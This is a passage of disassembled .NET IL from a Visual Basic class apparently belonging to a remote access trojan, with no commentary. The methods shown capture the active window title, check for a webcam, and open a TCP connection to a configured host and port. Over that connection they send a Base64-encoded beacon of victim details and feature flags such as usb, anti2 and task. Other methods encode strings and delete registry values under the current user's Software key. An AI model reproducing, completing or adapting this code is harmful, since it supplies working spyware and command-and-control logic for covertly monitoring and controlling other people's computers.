      IL_002f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0034:  stloc.3
      IL_0035:  ldloc.2
      IL_0036:  ldloca.s   winTitle
      IL_0038:  ldloc.3
      IL_0039:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_003e:  call       int32 w.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_0043:  pop
      IL_0044:  ldloca.s   winTitle
      IL_0046:  call       string w.OK::ENB(string&)
      IL_004b:  stloc.1
      IL_004c:  leave.s    IL_0064

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_004e:  dup
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0054:  stloc.s    exception1
      IL_0056:  nop
      IL_0057:  ldstr      ""
      IL_005c:  stloc.1
      IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0062:  leave.s    IL_0064

    }  // end handler
    IL_0064:  nop
    IL_0065:  ldloc.1
    IL_0066:  stloc.0
    IL_0067:  br.s       IL_0069

    IL_0069:  ldloc.0
    IL_006a:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init ([0] string BS)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       87 (0x57)
    .maxstack  5
    .locals init ([0] bool Cam,
             [1] int32 num1,
             [2] class [mscorlib]System.Exception exception1,
             [3] string VB$t_string$S0,
             [4] string VB$t_string$S1,
             [5] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  nop
      IL_0005:  ldloc.1
      IL_0006:  conv.ovf.i2
      IL_0007:  ldc.i4.s   100
      IL_0009:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000e:  stloc.3
      IL_000f:  ldloca.s   VB$t_string$S0
      IL_0011:  ldc.i4.s   100
      IL_0013:  ldnull
      IL_0014:  stloc.s    VB$t_string$S1
      IL_0016:  ldloca.s   VB$t_string$S1
      IL_0018:  ldc.i4.s   100
      IL_001a:  call       bool w.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001f:  stloc.s    VB$CG$t_bool$S0
      IL_0021:  ldloc.s    VB$CG$t_bool$S0
      IL_0023:  brfalse.s  IL_0029

      IL_0025:  ldc.i4.1
      IL_0026:  stloc.0
      IL_0027:  leave.s    IL_0055

      IL_0029:  nop
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.4
      IL_0030:  cgt
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  stloc.s    VB$CG$t_bool$S0
      IL_0037:  ldloc.s    VB$CG$t_bool$S0
      IL_0039:  brtrue.s   IL_0005

      IL_003b:  leave.s    IL_004c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.2
      IL_0044:  nop
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004a:  leave.s    IL_004c

    }  // end handler
    IL_004c:  nop
    IL_004d:  ldc.i4.0
    IL_004e:  stloc.0
    IL_004f:  br.s       IL_0055

    IL_0051:  ldc.i4.0
    IL_0052:  stloc.0
    IL_0053:  br.s       IL_0055

    IL_0055:  ldloc.0
    IL_0056:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       157 (0x9d)
    .maxstack  3
    .locals init ([0] bool CompDir,
             [1] class [mscorlib]System.IO.DirectoryInfo directory,
             [2] class [mscorlib]System.IO.DirectoryInfo parent,
             [3] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0007:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0012:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  stloc.3
    IL_0021:  ldloc.3
    IL_0022:  brfalse.s  IL_0096

    IL_0024:  ldarg.0
    IL_0025:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002a:  stloc.1
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0031:  stloc.2
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0039:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003e:  ldloc.2
    IL_003f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0044:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0049:  ldc.i4.0
    IL_004a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004f:  ldc.i4.0
    IL_0050:  ceq
    IL_0052:  ldc.i4.0
    IL_0053:  ceq
    IL_0055:  stloc.3
    IL_0056:  ldloc.3
    IL_0057:  brfalse.s  IL_005d

    IL_0059:  ldc.i4.0
    IL_005a:  stloc.0
    IL_005b:  br.s       IL_009b

    IL_005d:  nop
    IL_005e:  ldloc.1
    IL_005f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0064:  stloc.1
    IL_0065:  ldloc.2
    IL_0066:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_006b:  stloc.2
    IL_006c:  ldloc.1
    IL_006d:  ldnull
    IL_006e:  ceq
    IL_0070:  ldloc.2
    IL_0071:  ldnull
    IL_0072:  ceq
    IL_0074:  and
    IL_0075:  stloc.3
    IL_0076:  ldloc.3
    IL_0077:  brfalse.s  IL_007d

    IL_0079:  ldc.i4.1
    IL_007a:  stloc.0
    IL_007b:  br.s       IL_009b

    IL_007d:  nop
    IL_007e:  ldloc.1
    IL_007f:  ldnull
    IL_0080:  ceq
    IL_0082:  stloc.3
    IL_0083:  ldloc.3
    IL_0084:  brfalse.s  IL_008a

    IL_0086:  ldc.i4.0
    IL_0087:  stloc.0
    IL_0088:  br.s       IL_009b

    IL_008a:  nop
    IL_008b:  ldloc.2
    IL_008c:  ldnull
    IL_008d:  ceq
    IL_008f:  ldc.i4.0
    IL_0090:  ceq
    IL_0092:  stloc.3
    IL_0093:  ldloc.3
    IL_0094:  brtrue.s   IL_0033

    IL_0096:  nop
    IL_0097:  ldc.i4.0
    IL_0098:  stloc.0
    IL_0099:  br.s       IL_009b

    IL_009b:  ldloc.0
    IL_009c:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       893 (0x37d)
    .maxstack  8
    .locals init ([0] bool connect,
             [1] class [mscorlib]System.IO.FileInfo lO,
             [2] class [mscorlib]System.Exception exception1,
             [3] class [mscorlib]System.Exception exception6,
             [4] class [mscorlib]System.Exception exception7,
             [5] string str,
             [6] class [mscorlib]System.Exception exception8,
             [7] class [mscorlib]System.Exception exception9,
             [8] class [mscorlib]System.IO.FileInfo VB$t_ref$L0,
             [9] object[] VB$t_array$S0,
             [10] string VB$t_string$S0,
             [11] string[] VB$t_array$S1,
             [12] string[] VB$t_array$S2,
             [13] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  stsfld     bool w.OK::Cn
    IL_0007:  ldc.i4     0x7d0
    IL_000c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0011:  nop
    IL_0012:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
    IL_0017:  stloc.1
    IL_0018:  nop
    IL_0019:  ldloc.1
    IL_001a:  stloc.s    VB$t_ref$L0
    IL_001c:  ldloc.s    VB$t_ref$L0
    IL_001e:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0023:  nop
    IL_0024:  nop
    .try
    {
      IL_0025:  nop
      .try
      {
        IL_0026:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_002b:  ldnull
        IL_002c:  ceq
        IL_002e:  ldc.i4.0
        IL_002f:  ceq
        IL_0031:  stloc.s    VB$CG$t_bool$S0
        IL_0033:  ldloc.s    VB$CG$t_bool$S0
        IL_0035:  brfalse.s  IL_005b

        IL_0037:  nop
        .try
        {
          IL_0038:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
          IL_003d:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0042:  nop
          IL_0043:  ldnull
          IL_0044:  stsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
          IL_0049:  leave.s    IL_005a

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_004b:  dup
          IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0051:  stloc.2
          IL_0052:  nop
          IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0058:  leave.s    IL_005a

        }  // end handler
        IL_005a:  nop
        IL_005b:  nop
        IL_005c:  nop
        .try
        {
          IL_005d:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
          IL_0062:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_0067:  nop
          IL_0068:  leave.s    IL_0079

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_006a:  dup
          IL_006b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0070:  stloc.3
          IL_0071:  nop
          IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0077:  leave.s    IL_0079

        }  // end handler
        IL_0079:  nop
        IL_007a:  leave.s    IL_008c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_007c:  dup
        IL_007d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0082:  stloc.s    exception7
        IL_0084:  nop
        IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_008a:  leave.s    IL_008c

      }  // end handler
      IL_008c:  nop
      IL_008d:  nop
      .try
      {
        IL_008e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0093:  stsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
        IL_0098:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_009d:  stsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00a2:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00a7:  ldc.i4     0x32000
        IL_00ac:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_00b1:  nop
        IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00b7:  ldc.i4     0x32000
        IL_00bc:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00c1:  nop
        IL_00c2:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00c7:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00cc:  ldc.i4     0x2710
        IL_00d1:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_00d6:  nop
        IL_00d7:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00dc:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00e1:  ldc.i4     0x2710
        IL_00e6:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_00eb:  nop
        IL_00ec:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00f1:  ldnull
        IL_00f2:  ldstr      "Connect"
        IL_00f7:  ldc.i4.2
        IL_00f8:  newarr     [mscorlib]System.Object
        IL_00fd:  stloc.s    VB$t_array$S0
        IL_00ff:  ldloc.s    VB$t_array$S0
        IL_0101:  ldc.i4.0
        IL_0102:  ldsfld     string w.OK::HH
        IL_0107:  call       object w.OK::MH(string)
        IL_010c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0111:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0116:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_011b:  stelem.ref
        IL_011c:  nop
        IL_011d:  ldloc.s    VB$t_array$S0
        IL_011f:  ldc.i4.1
        IL_0120:  ldsfld     string w.OK::P
        IL_0125:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_012a:  box        [mscorlib]System.Int32
        IL_012f:  stelem.ref
        IL_0130:  nop
        IL_0131:  ldloc.s    VB$t_array$S0
        IL_0133:  ldnull
        IL_0134:  ldnull
        IL_0135:  ldnull
        IL_0136:  ldc.i4.1
        IL_0137:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_013c:  pop
        IL_013d:  ldsfld     string w.OK::HH
        IL_0142:  call       object w.OK::MH(string)
        IL_0147:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_014c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_0151:  stsfld     string w.OK::H
        IL_0156:  ldc.i4.1
        IL_0157:  stsfld     bool w.OK::Cn
        IL_015c:  call       string w.OK::inf()
        IL_0161:  call       bool w.OK::Send(string)
        IL_0166:  pop
        IL_0167:  nop
        .try
        {
          IL_0168:  ldstr      "vn"
          IL_016d:  ldstr      ""
          IL_0172:  call       object w.OK::GTV(string,
                                                object)
          IL_0177:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_017c:  ldstr      ""
          IL_0181:  ldc.i4.0
          IL_0182:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_0187:  stloc.s    VB$CG$t_bool$S0
          IL_0189:  ldloc.s    VB$CG$t_bool$S0
          IL_018b:  brfalse.s  IL_01a7

          IL_018d:  ldloc.s    str
          IL_018f:  ldsflda    string w.OK::VN
          IL_0194:  call       string w.OK::DEB(string&)
          IL_0199:  ldstr      "\r\n"
          IL_019e:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01a3:  stloc.s    str
          IL_01a5:  br.s       IL_01d8

          IL_01a7:  nop
          IL_01a8:  ldloc.s    str
          IL_01aa:  ldstr      "vn"
          IL_01af:  ldstr      ""
          IL_01b4:  call       object w.OK::GTV(string,
                                                object)
          IL_01b9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
          IL_01be:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_01c3:  stloc.s    VB$t_string$S0
          IL_01c5:  ldloca.s   VB$t_string$S0
          IL_01c7:  call       string w.OK::DEB(string&)
          IL_01cc:  ldstr      "\r\n"
          IL_01d1:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01d6:  stloc.s    str
          IL_01d8:  nop
          IL_01d9:  ldc.i4.s   20
          IL_01db:  newarr     [mscorlib]System.String
          IL_01e0:  stloc.s    VB$t_array$S2
          IL_01e2:  ldloc.s    VB$t_array$S2
          IL_01e4:  ldc.i4.0
          IL_01e5:  ldc.i4.5
          IL_01e6:  newarr     [mscorlib]System.String
          IL_01eb:  stloc.s    VB$t_array$S1
          IL_01ed:  ldloc.s    VB$t_array$S1
          IL_01ef:  ldc.i4.0
          IL_01f0:  ldloc.s    str
          IL_01f2:  stelem.ref
          IL_01f3:  nop
          IL_01f4:  ldloc.s    VB$t_array$S1
          IL_01f6:  ldc.i4.1
          IL_01f7:  ldsfld     string w.OK::H
          IL_01fc:  stelem.ref
          IL_01fd:  nop
          IL_01fe:  ldloc.s    VB$t_array$S1
          IL_0200:  ldc.i4.2
          IL_0201:  ldstr      ":"
          IL_0206:  stelem.ref
          IL_0207:  nop
          IL_0208:  ldloc.s    VB$t_array$S1
          IL_020a:  ldc.i4.3
          IL_020b:  ldsfld     string w.OK::P
          IL_0210:  stelem.ref
          IL_0211:  nop
          IL_0212:  ldloc.s    VB$t_array$S1
          IL_0214:  ldc.i4.4
          IL_0215:  ldstr      "\r\n"
          IL_021a:  stelem.ref
          IL_021b:  nop
          IL_021c:  ldloc.s    VB$t_array$S1
          IL_021e:  call       string [mscorlib]System.String::Concat(string[])
          IL_0223:  stelem.ref
          IL_0224:  nop
          IL_0225:  ldloc.s    VB$t_array$S2
          IL_0227:  ldc.i4.1
          IL_0228:  ldsfld     string w.OK::DR
          IL_022d:  stelem.ref
          IL_022e:  nop
          IL_022f:  ldloc.s    VB$t_array$S2
          IL_0231:  ldc.i4.2
          IL_0232:  ldstr      "\r\n"
          IL_0237:  stelem.ref
          IL_0238:  nop
          IL_0239:  ldloc.s    VB$t_array$S2
          IL_023b:  ldc.i4.3
          IL_023c:  ldsfld     string w.OK::EXE
          IL_0241:  stelem.ref
          IL_0242:  nop
          IL_0243:  ldloc.s    VB$t_array$S2
          IL_0245:  ldc.i4.4
          IL_0246:  ldstr      "\r\n"
          IL_024b:  stelem.ref
          IL_024c:  nop
          IL_024d:  ldloc.s    VB$t_array$S2
          IL_024f:  ldc.i4.5
          IL_0250:  ldsfld     bool w.OK::Idr
          IL_0255:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_025a:  stelem.ref
          IL_025b:  nop
          IL_025c:  ldloc.s    VB$t_array$S2
          IL_025e:  ldc.i4.6
          IL_025f:  ldstr      "\r\n"
          IL_0264:  stelem.ref
          IL_0265:  nop
          IL_0266:  ldloc.s    VB$t_array$S2
          IL_0268:  ldc.i4.7
          IL_0269:  ldsfld     bool w.OK::IsF
          IL_026e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0273:  stelem.ref
          IL_0274:  nop
          IL_0275:  ldloc.s    VB$t_array$S2
          IL_0277:  ldc.i4.8
          IL_0278:  ldstr      "\r\n"
          IL_027d:  stelem.ref
          IL_027e:  nop
          IL_027f:  ldloc.s    VB$t_array$S2
          IL_0281:  ldc.i4.s   9
          IL_0283:  ldsfld     bool w.OK::Isu
          IL_0288:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_028d:  stelem.ref
          IL_028e:  nop
          IL_028f:  ldloc.s    VB$t_array$S2
          IL_0291:  ldc.i4.s   10
          IL_0293:  ldstr      "\r\n"
          IL_0298:  stelem.ref
          IL_0299:  nop
          IL_029a:  ldloc.s    VB$t_array$S2
          IL_029c:  ldc.i4.s   11
          IL_029e:  ldsfld     bool w.OK::BD
          IL_02a3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02a8:  stelem.ref
          IL_02a9:  nop
          IL_02aa:  ldloc.s    VB$t_array$S2
          IL_02ac:  ldc.i4.s   12
          IL_02ae:  ldstr      "\r\n"
          IL_02b3:  stelem.ref
          IL_02b4:  nop
          IL_02b5:  ldloc.s    VB$t_array$S2
          IL_02b7:  ldc.i4.s   13
          IL_02b9:  ldsfld     bool w.OK::HD
          IL_02be:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02c3:  stelem.ref
          IL_02c4:  nop
          IL_02c5:  ldloc.s    VB$t_array$S2
          IL_02c7:  ldc.i4.s   14
          IL_02c9:  ldstr      "\r\n"
          IL_02ce:  stelem.ref
          IL_02cf:  nop
          IL_02d0:  ldloc.s    VB$t_array$S2
          IL_02d2:  ldc.i4.s   15
          IL_02d4:  ldsfld     bool w.OK::usb
          IL_02d9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02de:  stelem.ref
          IL_02df:  nop
          IL_02e0:  ldloc.s    VB$t_array$S2
          IL_02e2:  ldc.i4.s   16
          IL_02e4:  ldstr      "\r\n"
          IL_02e9:  stelem.ref
          IL_02ea:  nop
          IL_02eb:  ldloc.s    VB$t_array$S2
          IL_02ed:  ldc.i4.s   17
          IL_02ef:  ldsfld     bool w.OK::anti2
          IL_02f4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_02f9:  stelem.ref
          IL_02fa:  nop
          IL_02fb:  ldloc.s    VB$t_array$S2
          IL_02fd:  ldc.i4.s   18
          IL_02ff:  ldstr      "\r\n"
          IL_0304:  stelem.ref
          IL_0305:  nop
          IL_0306:  ldloc.s    VB$t_array$S2
          IL_0308:  ldc.i4.s   19
          IL_030a:  ldsfld     bool w.OK::task
          IL_030f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0314:  stelem.ref
          IL_0315:  nop
          IL_0316:  ldloc.s    VB$t_array$S2
          IL_0318:  call       string [mscorlib]System.String::Concat(string[])
          IL_031d:  stloc.s    str
          IL_031f:  ldstr      "inf"
          IL_0324:  ldsfld     string w.OK::Y
          IL_0329:  ldloca.s   str
          IL_032b:  call       string w.OK::ENB(string&)
          IL_0330:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0335:  call       bool w.OK::Send(string)
          IL_033a:  pop
          IL_033b:  leave.s    IL_034d

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_033d:  dup
          IL_033e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0343:  stloc.s    exception8
          IL_0345:  nop
          IL_0346:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_034b:  leave.s    IL_034d

        }  // end handler
        IL_034d:  nop
        IL_034e:  leave.s    IL_0366

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0350:  dup
        IL_0351:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0356:  stloc.s    exception9
        IL_0358:  nop
        IL_0359:  ldc.i4.0
        IL_035a:  stsfld     bool w.OK::Cn
        IL_035f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0364:  leave.s    IL_0366

      }  // end handler
      IL_0366:  nop
      IL_0367:  nop
      IL_0368:  leave.s    IL_0373

    }  // end .try
    finally
    {
      IL_036a:  ldloc.s    VB$t_ref$L0
      IL_036c:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0371:  nop
      IL_0372:  endfinally
    }  // end handler
    IL_0373:  ldsfld     bool w.OK::Cn
    IL_0378:  stloc.0
    IL_0379:  br.s       IL_037b

    IL_037b:  ldloc.0
    IL_037c:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  1
    .locals init ([0] string DEB,
             [1] uint8[] VB$t_array$S0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.1
    IL_0009:  ldloca.s   VB$t_array$S0
    IL_000b:  call       string w.OK::BS(uint8[]&)
    IL_0010:  stloc.0
    IL_0011:  br.s       IL_0013

    IL_0013:  ldloc.0
    IL_0014:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       65 (0x41)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.Exception exception1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string w.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldarg.0
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002c:  nop
      IL_002d:  leave.s    IL_003e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002f:  dup
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  stloc.0
      IL_0036:  nop
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003c:  leave.s    IL_003e

    }  // end handler
    IL_003e:  nop
    IL_003f:  nop
    IL_0040:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void w.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method OK::ED

  .method public static string  ENB(string& s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  1
    .locals init ([0] string ENB)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  call       uint8[] w.OK::SB(string&)
    IL_0007:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method OK::ENB

  .method public static object  GTV(string n,
